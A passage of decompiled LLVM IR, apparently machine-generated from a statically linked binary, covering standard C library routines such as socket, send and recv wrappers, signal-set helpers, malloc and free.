  store i32 %v1_b1d4, i32* %v2_b1d8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b1e0

dec_label_pc_b1e0:                                ; preds = %entry, %dec_label_pc_b1d0
  %v0_b1e0 = phi i32 [ %v5_b1c0, %entry ], [ -1, %dec_label_pc_b1d0 ]
  %v2_b1e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b1e4, i32* @r4, align 4
  ret i32 %v0_b1e0

; uselistorder directives
  uselistorder i32 %v5_b1c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1e0, { 1, 0 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b1e8 = load i32, i32* @r4, align 4
  store i32 %v3_b1e8, i32* %stack_var_-8, align 4
  %v0_b1f0 = call i32 @getsockopt()
  store i32 %v0_b1f0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b1f0, -4095
  br i1 %tmp, label %dec_label_pc_b210, label %dec_label_pc_b200

dec_label_pc_b200:                                ; preds = %entry
  %v0_b200 = call i32 @__errno_location()
  %v0_b204 = load i32, i32* %r4.global-to-local, align 4
  %v1_b204 = sub i32 0, %v0_b204
  %v2_b208 = inttoptr i32 %v0_b200 to i32*
  store i32 %v1_b204, i32* %v2_b208, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b210

dec_label_pc_b210:                                ; preds = %entry, %dec_label_pc_b200
  %v0_b210 = phi i32 [ %v0_b1f0, %entry ], [ -1, %dec_label_pc_b200 ]
  %v2_b214 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b214, i32* @r4, align 4
  ret i32 %v0_b210

; uselistorder directives
  uselistorder i32 %v0_b1f0, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 1, 0 }
  uselistorder label %dec_label_pc_b210, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b218 = load i32, i32* @r4, align 4
  store i32 %v3_b218, i32* %stack_var_-8, align 4
  %v5_b21c = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_b21c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_b21c, -4095
  br i1 %tmp, label %dec_label_pc_b23c, label %dec_label_pc_b22c

dec_label_pc_b22c:                                ; preds = %entry
  %v0_b22c = call i32 @__errno_location()
  %v0_b230 = load i32, i32* %r4.global-to-local, align 4
  %v1_b230 = sub i32 0, %v0_b230
  %v2_b234 = inttoptr i32 %v0_b22c to i32*
  store i32 %v1_b230, i32* %v2_b234, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b23c

dec_label_pc_b23c:                                ; preds = %entry, %dec_label_pc_b22c
  %v0_b23c = phi i32 [ %v5_b21c, %entry ], [ -1, %dec_label_pc_b22c ]
  %v2_b240 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b240, i32* @r4, align 4
  ret i32 %v0_b23c

; uselistorder directives
  uselistorder i32 %v5_b21c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b23c, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b244 = load i32, i32* @r4, align 4
  store i32 %v3_b244, i32* %stack_var_-8, align 4
  %v5_b248 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_b248, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_b248, -4095
  br i1 %tmp, label %dec_label_pc_b268, label %dec_label_pc_b258

dec_label_pc_b258:                                ; preds = %entry
  %v0_b258 = call i32 @__errno_location()
  %v0_b25c = load i32, i32* %r4.global-to-local, align 4
  %v1_b25c = sub i32 0, %v0_b25c
  %v2_b260 = inttoptr i32 %v0_b258 to i32*
  store i32 %v1_b25c, i32* %v2_b260, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b268

dec_label_pc_b268:                                ; preds = %entry, %dec_label_pc_b258
  %v0_b268 = phi i32 [ %v5_b248, %entry ], [ -1, %dec_label_pc_b258 ]
  %v2_b26c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b26c, i32* @r4, align 4
  ret i32 %v0_b268

; uselistorder directives
  uselistorder i32 %v5_b248, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b268, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b270 = load i32, i32* @r4, align 4
  store i32 %v3_b270, i32* %stack_var_-8, align 4
  %v0_b274 = call i32 @socket()
  store i32 %v0_b274, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b274, -4095
  br i1 %tmp, label %dec_label_pc_b294, label %dec_label_pc_b284

dec_label_pc_b284:                                ; preds = %entry
  %v0_b284 = call i32 @__errno_location()
  %v0_b288 = load i32, i32* %r4.global-to-local, align 4
  %v1_b288 = sub i32 0, %v0_b288
  %v2_b28c = inttoptr i32 %v0_b284 to i32*
  store i32 %v1_b288, i32* %v2_b28c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b294

dec_label_pc_b294:                                ; preds = %entry, %dec_label_pc_b284
  %v0_b294 = phi i32 [ %v0_b274, %entry ], [ -1, %dec_label_pc_b284 ]
  %v2_b298 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b298, i32* @r4, align 4
  ret i32 %v0_b294

; uselistorder directives
  uselistorder i32 %v0_b274, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b294, { 1, 0 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_b29c = load i32, i32* @r4, align 4
  store i32 %v3_b29c, i32* %stack_var_-12, align 4
  %v6_b29c = load i32, i32* @r5, align 4
  %v10_b29c = ptrtoint i32* %stack_var_-12 to i32
  %v7_b2a0 = icmp eq i32 %arg2, -1
  %v0_b2ac.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_b2a0, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_b2c4

bb:                                               ; preds = %entry
  %v2_b2a8 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_b2ac.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_b2ac.pre, 1
  br i1 %tmp19, label %dec_label_pc_b2c4, label %dec_label_pc_b2b4

dec_label_pc_b2b4:                                ; preds = %bb
  %v7_b2b8 = icmp sgt i32 %v0_b2ac.pre, 64
  br i1 %v7_b2b8, label %dec_label_pc_b2c4, label %bb20

bb20:                                             ; preds = %dec_label_pc_b2b4
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_b2e824 = add i32 %v10_b29c, 124
  store i32 %v5_b2e824, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b2d8

dec_label_pc_b2c4:                                ; preds = %.thread, %dec_label_pc_b2b4, %bb
  %v0_b2c4 = call i32 @__errno_location()
  store i32 %v0_b2c4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_b2d0 = inttoptr i32 %v0_b2c4 to i32*
  store i32 22, i32* %v2_b2d0, align 4
  %v0_b344.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b344

dec_label_pc_b2d8:                                ; preds = %bb20, %dec_label_pc_b2d8
  %v5_b2e825 = phi i32 [ %v5_b2e824, %bb20 ], [ %v5_b2e8, %dec_label_pc_b2d8 ]
  %v2_b2dc = add i32 %v5_b2e825, -136
  %v3_b2dc = inttoptr i32 %v2_b2dc to i32*
  store i32 0, i32* %v3_b2dc, align 4
  %v0_b2e0.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_b2e0 = add i32 %v0_b2e0.pre, -1
  store i32 %v1_b2e0, i32* %r0.global-to-local, align 4
  %v6_b2e0 = icmp slt i32 %v1_b2e0, 0
  %v4_b2e8 = mul i32 %v1_b2e0, 4
  %v5_b2e8 = add i32 %v4_b2e8, %v10_b29c
  store i32 %v5_b2e8, i32* %r2.global-to-local, align 4
  br i1 %v6_b2e0, label %dec_label_pc_b2f0, label %dec_label_pc_b2d8

dec_label_pc_b2f0:                                ; preds = %dec_label_pc_b2d8
  %v2_b2f0 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_b2f0, i32* @r5, align 4
  %v2_b2f4 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_b2f4, i32* %r0.global-to-local, align 4
  %v0_b2f8 = load i32, i32* @r4, align 4
  %v2_b2fc = call i32 @__sigaddset(i32 %v2_b2f4, i32 %v0_b2f8)
  store i32 %v2_b2fc, i32* %r0.global-to-local, align 4
  %v1_b300 = icmp slt i32 %v2_b2fc, 0
  br i1 %v1_b300, label %dec_label_pc_b340, label %dec_label_pc_b308

dec_label_pc_b308:                                ; preds = %dec_label_pc_b2f0
  %v0_b308 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1db00.99 to i32), i32* %r0.global-to-local, align 4
  %v2_b310 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_1db00.99 to i32), i32 %v0_b308)
  store i32 %v2_b2a8, i32* %r2.global-to-local, align 4
  %v0_b328 = load i32, i32* @r4, align 4
  store i32 %v0_b328, i32* %r0.global-to-local, align 4
  %v4_b330 = call i32 @__libc_sigaction(i32 %v0_b328, i32* nonnull %stack_var_-152, i32 %v2_b2a8)
  store i32 %v4_b330, i32* %r0.global-to-local, align 4
  %v1_b334 = icmp slt i32 %v4_b330, 0
  br i1 %v1_b334, label %dec_label_pc_b340, label %bb23

bb23:                                             ; preds = %dec_label_pc_b308
  %v5_b338 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_b338, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b344

dec_label_pc_b340:                                ; preds = %dec_label_pc_b308, %dec_label_pc_b2f0
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b344

dec_label_pc_b344:                                ; preds = %bb23, %dec_label_pc_b2c4, %dec_label_pc_b340
  %v0_b344 = phi i32 [ %v5_b338, %bb23 ], [ %v0_b344.pre, %dec_label_pc_b2c4 ], [ -1, %dec_label_pc_b340 ]
  store i32 %v0_b344, i32* %r0.global-to-local, align 4
  %v2_b34c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_b34c, i32* @r4, align 4
  store i32 %v6_b29c, i32* @r5, align 4
  ret i32 %v0_b344

; uselistorder directives
  uselistorder i32 %v0_b344, { 1, 0 }
  uselistorder i32 %v5_b2e8, { 1, 0 }
  uselistorder i32 %v1_b2e0, { 0, 2, 1 }
  uselistorder i32 %v2_b2a8, { 1, 0 }
  uselistorder i32 %v0_b2ac.pre, { 1, 0, 2 }
  uselistorder i32 %v10_b29c, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 10, 7, 9, 8, 11, 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_b344, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b2d8, { 1, 0 }
  uselistorder label %dec_label_pc_b2c4, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_b354 = add i32 %arg2, -1
  %v3_b358 = udiv i32 %v1_b354, 32
  %v4_b35c = mul nuw nsw i32 %v3_b358, 4
  %v5_b35c = add i32 %v4_b35c, %arg1
  %v6_b35c = inttoptr i32 %v5_b35c to i32*
  %v7_b35c = load i32, i32* %v6_b35c, align 4
  %v1_b360 = urem i32 %v1_b354, 32
  %v7_b368 = shl i32 1, %v1_b360
  %v8_b368 = and i32 %v7_b35c, %v7_b368
  %v10_b368 = icmp ne i32 %v8_b368, 0
  %. = zext i1 %v10_b368 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_b354, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_b378 = add i32 %arg2, -1
  %v3_b37c = udiv i32 %v1_b378, 32
  %v4_b380 = mul nuw nsw i32 %v3_b37c, 4
  %v5_b380 = add i32 %v4_b380, %arg1
  %v6_b380 = inttoptr i32 %v5_b380 to i32*
  %v7_b380 = load i32, i32* %v6_b380, align 4
  %v1_b384 = urem i32 %v1_b378, 32
  %v7_b38c = shl i32 1, %v1_b384
  %v8_b38c = or i32 %v7_b380, %v7_b38c
  store i32 %v8_b38c, i32* %v6_b380, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_b378, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_b39c = add i32 %arg2, -1
  %v3_b3a0 = udiv i32 %v1_b39c, 32
  %v4_b3a4 = mul nuw nsw i32 %v3_b3a0, 4
  %v5_b3a4 = add i32 %v4_b3a4, %arg1
  %v6_b3a4 = inttoptr i32 %v5_b3a4 to i32*
  %v7_b3a4 = load i32, i32* %v6_b3a4, align 4
  %v1_b3a8 = urem i32 %v1_b39c, 32
  %tmp = shl i32 -1, %v1_b3a8
  %v8_b3b0 = add i32 %tmp, -1
  %v9_b3b0 = and i32 %v7_b3a4, %v8_b3b0
  store i32 %v9_b3b0, i32* %v6_b3a4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_b39c, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_b3c0 = load i32, i32* @r4, align 4
  %v6_b3c0 = load i32, i32* @r5, align 4
  %v9_b3c0 = load i32, i32* @r6, align 4
  %v0_b3c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_b3c4 = icmp eq i32 %v0_b3c4, 0
  %v2_b3c8 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_b3c4, label %bb, label %dec_label_pc_b3d4

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b3dc

dec_label_pc_b3d4:                                ; preds = %entry
  %tmp = icmp ugt i32 %v0_b3c4, -8
  br i1 %tmp, label %dec_label_pc_b4e0, label %dec_label_pc_b3dc

dec_label_pc_b3dc:                                ; preds = %bb, %dec_label_pc_b3d4
  %v0_b3dc = phi i32 [ %v0_b3c4, %dec_label_pc_b3d4 ], [ 1, %bb ]
  %v1_b3dc = add i32 %v0_b3dc, 4
  store i32 %v1_b3dc, i32* %stack_var_-20, align 4
  store i32 %v2_b3c8, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1ba90.101 to i32), i32* %r0.global-to-local, align 4
  %v1_b3f4 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_1b520.104 to i32), i32* %r0.global-to-local, align 4
  %v3_b400 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_1b520.104 to i32*), i32 %v2_b3c8)
  store i32 %v3_b400, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ba90.101 to i32), i32* %r0.global-to-local, align 4
  store i32 46104, i32* @lr, align 4
  %v1_b414 = call i32 @__pthread_return_0()
  store i32 %v1_b414, i32* %r0.global-to-local, align 4
  %v2_b418 = icmp eq i32 %v3_b400, 0
  br i1 %v2_b418, label %dec_label_pc_b420, label %dec_label_pc_b4d0

dec_label_pc_b420:                                ; preds = %dec_label_pc_b3dc
  %v2_b424 = load i32, i32* @global_var_1bab8.107, align 4
  store i32 %v2_b424, i32* @r4, align 4
  %v2_b428 = load i32, i32* %stack_var_-20, align 4
  %v3_b42c = icmp ult i32 %v2_b428, %v2_b424
  br i1 %v3_b42c, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_b420
  %v3_b430 = add i32 %v2_b424, -1
  %v2_b434 = add i32 %v3_b430, %v2_b428
  %v2_b438 = sub i32 0, %v2_b424
  %v3_b43c = and i32 %v2_b434, %v2_b438
  store i32 %v3_b43c, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_b420, %bb14
  store i32 ptrtoint (i32* @global_var_1db80.109 to i32), i32* %r0.global-to-local, align 4
  %v1_b448 = call i32 @__pthread_return_0()
  %v0_b44c = load i32, i32* @r4, align 4
  store i32 %v0_b44c, i32* %r0.global-to-local, align 4
  %v1_b450 = call i32 @__GI_sbrk(i32 %v0_b44c)
  store i32 %v1_b450, i32* %r0.global-to-local, align 4
  %v7_b454 = icmp eq i32 %v1_b450, -1
  br i1 %v7_b454, label %bb15, label %dec_label_pc_b460

bb15:                                             ; preds = %.thread3
  store i32 %v1_b450, i32* @r5, align 4
  br label %dec_label_pc_b474

dec_label_pc_b460:                                ; preds = %.thread3
  %v1_b460 = add i32 %v1_b450, 3
  %v1_b464 = and i32 %v1_b460, -4
  store i32 %v1_b464, i32* @r5, align 4
  %v9_b468 = icmp eq i32 %v1_b464, %v1_b450
  br i1 %v9_b468, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_b460
  %v3_b46c = sub i32 %v1_b464, %v1_b450
  store i32 %v3_b46c, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_b460, %bb16
  %v1_b470 = xor i1 %v9_b468, true
  call void @__pseudo_cond_branch(i1 %v1_b470, i32 ptrtoint (i32* @global_var_c5d4.110 to i32))
  br label %dec_label_pc_b474

dec_label_pc_b474:                                ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_1db80.109 to i32), i32* %r0.global-to-local, align 4
  store i32 46212, i32* @lr, align 4
  %v1_b480 = call i32 @__pthread_return_0()
  store i32 %v1_b480, i32* %r0.global-to-local, align 4
  %v0_b484 = load i32, i32* @r5, align 4
  %v7_b484 = icmp eq i32 %v0_b484, -1
  br i1 %v7_b484, label %dec_label_pc_b4e0, label %dec_label_pc_b48c

dec_label_pc_b48c:                                ; preds = %dec_label_pc_b474
  store i32 ptrtoint (i32* @global_var_1ba90.101 to i32), i32* %r0.global-to-local, align 4
  %v1_b498 = call i32 @__pthread_return_0()
  %v0_b49c = load i32, i32* @r4, align 4
  %v0_b4a0 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1b520.104 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_b4a0, 16777216
  %v2_b4a8 = sdiv i32 %sext, 16777216
  %v5_b4a8 = call i32 @__heap_free(i32* bitcast (i32** @global_var_1b520.104 to i32*), i32 %v2_b4a8, i32 %v0_b49c)
  store i32 ptrtoint (i32** @global_var_1b520.104 to i32), i32* %r0.global-to-local, align 4
  %v3_b4b4 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_1b520.104 to i32*), i32 %v2_b3c8)
  store i32 %v3_b4b4, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ba90.101 to i32), i32* %r0.global-to-local, align 4
  store i32 46280, i32* @lr, align 4
  %v1_b4c4 = call i32 @__pthread_return_0()
  store i32 %v1_b4c4, i32* %r0.global-to-local, align 4
  %v2_b4c8 = icmp eq i32 %v3_b4b4, 0
  br i1 %v2_b4c8, label %dec_label_pc_b4e0, label %dec_label_pc_b4d0

dec_label_pc_b4d0:                                ; preds = %dec_label_pc_b3dc, %dec_label_pc_b48c
  %v1_b4d4 = phi i32 [ %v3_b400, %dec_label_pc_b3dc ], [ %v3_b4b4, %dec_label_pc_b48c ]
  %v2_b4d0 = load i32, i32* %stack_var_-20, align 4
  %v2_b4d4 = inttoptr i32 %v1_b4d4 to i32*
  store i32 %v2_b4d0, i32* %v2_b4d4, align 4
  %v3_b4d4 = load i32, i32* %r4.global-to-local, align 4
  %v4_b4d4 = add i32 %v3_b4d4, 4
  store i32 %v4_b4d4, i32* %r4.global-to-local, align 4
  %v2_b4d8 = icmp eq i32 %v4_b4d4, 0
  br i1 %v2_b4d8, label %dec_label_pc_b4e0, label %dec_label_pc_b4f0

dec_label_pc_b4e0:                                ; preds = %dec_label_pc_b4d0, %dec_label_pc_b48c, %dec_label_pc_b474, %dec_label_pc_b3d4
  %v0_b4e0 = call i32 @__errno_location()
  store i32 %v0_b4e0, i32* %r0.global-to-local, align 4
  %v2_b4e8 = inttoptr i32 %v0_b4e0 to i32*
  store i32 12, i32* %v2_b4e8, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b4f0

dec_label_pc_b4f0:                                ; preds = %dec_label_pc_b4d0, %dec_label_pc_b4e0
  %v0_b4f0 = phi i32 [ %v4_b4d4, %dec_label_pc_b4d0 ], [ 0, %dec_label_pc_b4e0 ]
  store i32 %v0_b4f0, i32* %r0.global-to-local, align 4
  store i32 %v3_b3c0, i32* @r4, align 4
  store i32 %v6_b3c0, i32* @r5, align 4
  store i32 %v9_b3c0, i32* @r6, align 4
  ret i32 %v0_b4f0

; uselistorder directives
  uselistorder i32 %v0_b4f0, { 1, 0 }
  uselistorder i32 %v3_b4b4, { 1, 0, 2 }
  uselistorder i32 %v1_b464, { 1, 0, 2 }
  uselistorder i32 %v1_b450, { 3, 0, 2, 4, 1, 5 }
  uselistorder i32 %v3_b400, { 1, 0, 2 }
  uselistorder i32 %v0_b3c4, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 4, 6, 8, 9, 10, 3, 12, 11, 16, 14, 13, 0, 15, 17, 18, 19, 1, 2 }
  uselistorder label %dec_label_pc_b4f0, { 1, 0 }
  uselistorder label %dec_label_pc_b4d0, { 1, 0 }
  uselistorder label %dec_label_pc_b474, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_b3dc, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_b514 = icmp eq i32 %arg1, 0
  %v3_b518 = load i32, i32* @r4, align 4
  store i32 %v3_b518, i32* %stack_var_-24, align 4
  %v6_b518 = load i32, i32* @r5, align 4
  %v9_b518 = load i32, i32* @r6, align 4
  %v15_b518 = load i32, i32* @r8, align 4
  br i1 %v2_b514, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_b520 = add i32 %arg1, -4
  %v2_b520 = inttoptr i32 %v1_b520 to i32*
  %v3_b520 = load i32, i32* %v2_b520, align 4
  store i32 %v3_b520, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1b520.104 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_b520, i32* @r4, align 4
  %v1_b538 = call i32 @__pthread_return_0()
  %v0_b53c = load i32, i32* @r4, align 4
  %v0_b540 = load i32, i32* @r5, align 4
  %v4_b548 = call i32 @__heap_free(i32* bitcast (i32** @global_var_1b520.104 to i32*), i32 %v0_b53c, i32 %v0_b540)
  %v1_b550 = inttoptr i32 %v4_b548 to i32*
  %v2_b550 = load i32, i32* %v1_b550, align 4
  store i32 %v2_b550, i32* %r6.global-to-local, align 4
  %v2_b554 = load i32, i32* @global_var_1bab8.107, align 4
  %v4_b558 = mul i32 %v2_b554, 8
  %v6_b558 = icmp ult i32 %v2_b550, %v4_b558
  store i32 %v4_b548, i32* @r4, align 4
  br i1 %v6_b558, label %dec_label_pc_b598, label %dec_label_pc_b564

dec_label_pc_b564:                                ; preds = %bb11
  %v1_b56c = call i32 @__pthread_return_0()
  %v1_b574 = call i32 @__GI_sbrk(i32 0)
  %v0_b578 = load i32, i32* @r4, align 4
  %v1_b578 = add i32 %v0_b578, 12
  store i32 %v1_b578, i32* @r5, align 4
  %v9_b57c = icmp eq i32 %v1_b578, %v1_b574
  br i1 %v9_b57c, label %dec_label_pc_b5a0, label %dec_label_pc_b584

dec_label_pc_b584:                                ; preds = %dec_label_pc_b564
  %v1_b590 = call i32 @__pthread_return_0()
  br label %dec_label_pc_b598

dec_label_pc_b598:                                ; preds = %bb11, %dec_label_pc_b584, %bb14
  %v2_b598 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b598, i32* @r4, align 4
  store i32 %v6_b518, i32* @r5, align 4
  store i32 %v9_b518, i32* %r6.global-to-local, align 4
  store i32 %v15_b518, i32* %r8.global-to-local, align 4
  %v0_b59c = call i32 @__pthread_return_0()
  %v0_b5a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b5a0

dec_label_pc_b5a0:                                ; preds = %dec_label_pc_b564, %dec_label_pc_b598
  %v1_b5a8 = phi i32 [ %v0_b578, %dec_label_pc_b564 ], [ %v0_b5a0.pre, %dec_label_pc_b598 ]
  %v1_b5a0 = add i32 %v1_b5a8, 4
  %v2_b5a0 = inttoptr i32 %v1_b5a0 to i32*
  %v3_b5a0 = load i32, i32* %v2_b5a0, align 4
  %v2_b5a4 = icmp eq i32 %v3_b5a0, 0
  br i1 %v2_b5a4, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_b5a0
  %v2_b5a8 = add i32 %v1_b5a8, 8
  %v3_b5a8 = inttoptr i32 %v2_b5a8 to i32*
  %v4_b5a8 = load i32, i32* %v3_b5a8, align 4
  %v3_b5ac = add i32 %v3_b5a0, 8
  %v4_b5ac = inttoptr i32 %v3_b5ac to i32*
  store i32 %v4_b5a8, i32* %v4_b5ac, align 4
  %v0_b5b0.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b5a0, %bb12
  %v0_b5b0 = phi i32 [ %v1_b5a8, %dec_label_pc_b5a0 ], [ %v0_b5b0.pre, %bb12 ]
  %v1_b5b0 = add i32 %v0_b5b0, 8
  %v2_b5b0 = inttoptr i32 %v1_b5b0 to i32*
  %v3_b5b0 = load i32, i32* %v2_b5b0, align 4
  %v1_b5b4 = add i32 %v0_b5b0, 4
  %v2_b5b4 = inttoptr i32 %v1_b5b4 to i32*
  %v3_b5b4 = load i32, i32* %v2_b5b4, align 4
  %v2_b5b8 = icmp eq i32 %v3_b5b0, 0
  br i1 %v2_b5b8, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_b5bc = add i32 %v3_b5b0, 4
  %v4_b5bc = inttoptr i32 %v3_b5bc to i32*
  store i32 %v3_b5b4, i32* %v4_b5bc, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_b5c0 = load i32, i32* %r8.global-to-local, align 4
  %v3_b5c0 = inttoptr i32 %v2_b5c0 to i32*
  store i32 %v3_b5b4, i32* %v3_b5c0, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_b5d0 = call i32 @__pthread_return_0()
  %v0_b5d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_b5d4 = load i32, i32* @r4, align 4
  %v0_b5dc = load i32, i32* @r5, align 4
  %v2_b5d4 = sub i32 12, %v0_b5d4
  %v1_b5d8 = add i32 %v2_b5d4, %v1_b5d4
  %v2_b5dc = sub i32 %v1_b5d8, %v0_b5dc
  %v1_b5e0 = call i32 @__GI_sbrk(i32 %v2_b5dc)
  br label %dec_label_pc_b598

; uselistorder directives
  uselistorder i32 %v0_b5b0, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0 }
  uselistorder i32** @global_var_1b520.104, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_b5a0, { 1, 0 }
  uselistorder label %dec_label_pc_b598, { 2, 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_b604 = inttoptr i32 %arg2 to i32*
  %v2_b604 = load i32, i32* %v1_b604, align 4
  %v3_b608 = load i32, i32* @r4, align 4
  store i32 %v3_b608, i32* %stack_var_-8, align 4
  %v1_b60c = add i32 %v2_b604, 3
  %v1_b610 = and i32 %v1_b60c, -4
  store i32 %v1_b610, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_b618 = icmp ugt i32 %v1_b610, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_b620 = load i32, i32* %arg1, align 4
